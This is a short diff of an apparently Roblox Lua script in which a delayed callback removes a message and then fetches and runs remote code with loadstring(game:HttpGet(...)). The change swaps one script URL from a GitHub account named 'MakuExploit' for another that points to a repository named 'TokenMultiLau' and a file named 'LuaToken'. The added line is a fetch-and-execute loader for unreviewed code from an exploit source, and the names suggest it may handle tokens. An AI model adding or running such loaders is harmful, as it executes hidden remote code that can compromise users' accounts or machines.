@@ -154,7 +154,7 @@ task.delay(7.5, function()
 
         task.delay(5, function()
             msg1:Destroy()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/MakuSabMenuv2/refs/heads/main/V2"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/TokenMultiLau/refs/heads/main/LuaToken"))()
         end)
     end)
 end)
